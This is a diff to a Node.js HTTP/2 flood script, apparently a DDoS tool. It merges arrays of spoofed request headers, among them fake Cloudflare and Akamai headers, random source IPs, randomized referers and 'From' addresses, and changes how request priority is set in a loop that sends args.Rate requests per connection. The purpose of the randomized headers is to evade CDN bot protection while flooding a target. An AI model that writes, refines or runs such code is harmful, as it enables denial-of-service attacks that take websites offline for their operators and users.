@@ -353,61 +353,43 @@ const bexHeaders1 = [
   { "Refresh": "5" },
   { "cf-mitigated": "challenge" },
   { "origin-agent-cluster": "?1" },
-]
-const bexHeaders2 = [
   { 'Nel': nelxnxx },
   { "dnt": "1" },
   { "Accept-Range": 'bytes' },
+  { "A-IM": "Feed" },
 ]
-const bexHeaders3 = [
+const bexHeaders2 = [
   { "Max-Forwards": Math.random() < 0.5 ? '5' : '10' },
   { "Service-Worker-Navigation-Preload": 'true' },
   { "Supports-Loading-Mode": "credentialed-prerender" },
-]
-const bexHeaders4 = [
   { 'viewport-height': '1080' },
   { "From": randstr(5) + '@gmail.com' },
-  { 'x-forwarded-port': "443" },
+  { "TK": "?" },
 ]
-const bexHeaders5 = [
+const bexHeaders3 = [
   { "Expect": "100-continue" },
   { "cluster-ip": randstr(5) },
   { "accept-char": "UTF-8" },
-]
-const bexHeaders6 = [
   { "CF-Visitor": `{"scheme":"https"}` },
   { "TTL-3": "1.5" },
   { "data-return": "false" },
 ]
-const bexHeaders7 = [
+const bexHeaders4 = [
   { "Observe-Browsing-Topics": "?1" },
   { "Width": "1920" },
   { 'device-memory': '0.25' },
-]
-const bexHeaders8 = [
   { "Delta-Base": '12340001' },
   { "Vary": randstr(5) },
-  { "CDN-Loop": 'cloudflare' },
+  { "Alt-Svc": `"h3=":443"; ma=86400` },
 ];
-const bexHeaders9 = [
+const bexHeaders5 = [
   { "akamai-origin-hop": randstr(5) },
   { "source-ip": randstr(5) },
   { "via": '1.1 ' + parsedTarget.host },
-];
-const bexHeaders10 = [
   { 'x-forwarded-protocol': "https" },
   { "downlink": Math.floor(Math.random() * 10) + 1 },
   { 'priority': Math.random() < 0.5 ? 'u=0, i' : 'u=3,i=?0' },
-];
-const bexHeaders11 = [
-  { "TK": "?" },
-  { "X-Frame-Options": "deny" },
-  { "cf-cache-status": 'DYNAMIC' },
-];
-const bexHeaders12 = [
-  { "A-IM": "Feed" },
   { "purpose": "prefetch" },
-  { "Alt-Svc": `"h3=":443"; ma=86400` },
 ];
 let bexHeaders = {
 "referer": Math.random() < 0.5 ? 'https://' + Ref : 'https://' + Ref + `/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`,
@@ -420,13 +402,6 @@ let bexHeaders = {
 ...(Math.random() < 0.5 ? bexHeaders3[Math.floor(Math.random() * bexHeaders3.length)] : {}),
 ...(Math.random() < 0.5 ? bexHeaders4[Math.floor(Math.random() * bexHeaders4.length)] : {}),
 ...(Math.random() < 0.5 ? bexHeaders5[Math.floor(Math.random() * bexHeaders5.length)] : {}),
-...(Math.random() < 0.5 ? bexHeaders6[Math.floor(Math.random() * bexHeaders6.length)] : {}),
-...(Math.random() < 0.5 ? bexHeaders7[Math.floor(Math.random() * bexHeaders7.length)] : {}),
-...(Math.random() < 0.5 ? bexHeaders8[Math.floor(Math.random() * bexHeaders8.length)] : {}),
-...(Math.random() < 0.5 ? bexHeaders9[Math.floor(Math.random() * bexHeaders9.length)] : {}),
-...(Math.random() < 0.5 ? bexHeaders10[Math.floor(Math.random() * bexHeaders10.length)] : {}),
-...(Math.random() < 0.5 ? bexHeaders11[Math.floor(Math.random() * bexHeaders11.length)] : {}),
-...(Math.random() < 0.5 ? bexHeaders12[Math.floor(Math.random() * bexHeaders12.length)] : {}),
 ...createPukimakHeaders(),
 ...(Math.random() < 0.75 ? {"Cache-Control": "max-age=0"} :{}),
 };
@@ -491,13 +466,12 @@ bexClient.on('connect', async () => {
 		if (tlsBex && !tlsBex.destroyed && tlsBex.writable) {
 			for (let i = 0; i < args.Rate; i++) {
 				const requestPromise = new Promise((resolve, reject) => {
-				const bex = bexClient.request(headersmemek);
-					bex.priority({
-						weight: Math.random() < 0.5 ? 255 : 220,
-						depends_on: 0,
-						exclusive: true
-					});
-					bex.on('response', response => {
+				const bex = bexClient.request(headersmemek, {
+                      weight: Math.random() < 0.5 ? 255 : 220,
+                      depends_on: 0,
+                      exclusive: Math.random() < 0.5 ? true : false,
+                      })
+                .on('response', response => {
 						bex.close();
 						bex.destroy();
 						resolve();
